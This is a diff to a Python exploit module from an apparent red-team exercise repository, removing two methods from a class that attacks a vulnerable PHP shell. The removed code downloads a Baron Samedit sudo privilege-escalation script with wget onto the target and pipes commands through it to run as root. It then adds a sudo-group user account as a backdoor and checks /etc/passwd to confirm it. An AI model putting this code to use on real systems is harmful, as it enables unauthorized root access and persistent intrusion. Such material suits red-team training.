@@ -45,32 +45,3 @@ class ChallengeTwoShellPHP(Exploit):
 		except PatchedException:
 			logger.info(f"{COLOR_FAIL}The target is not vulnerable to ChallengeTwoShellPHP.{COLOR_END}")
 			return False
-
-	def run_command_as_root(self, command):
-		logger.info(f"Running command `{command}` on root shell...")
-		full_command = f"cd /var/cache/apache2/mod_cache_disk; wget https://raw.githubusercontent.com/joshmcorreia/SDSU_Cyber_Security_Red_Team/main/exploits/baron_samedit.py; echo '{command}' | python3 baron_samedit.py"
-		server_output = self.run_custom_command(command=full_command)
-		logger.info(f"Root shell returned `{server_output}`.")
-		return server_output
-
-	def add_user(self, username):
-		"""
-		Adds a user to the target with sudo privileges.
-
-		idempotent: True
-
-		Returns True if the user is on the target, or False if not
-		"""
-		logger.info(f"Adding user `{username}` with sudo privileges...")
-		add_user_command = f"useradd -m {username} -g sudo -s /bin/bash 2>&1" # redirect stderr to stdout so it's returned to us
-		self.run_command_as_root(add_user_command)
-
-		# validate that the user was successfully added
-		check_user_id_command = f"grep -c '^{username}:' /etc/passwd"
-		command_output = self.run_command_as_root(check_user_id_command)
-		if command_output == "1":
-			logger.info(f"Successfully added `{username}` with sudo privileges.")
-			return True
-		else:
-			logger.info(f"Failed to add `{username}` with sudo privileges.")
-			return False
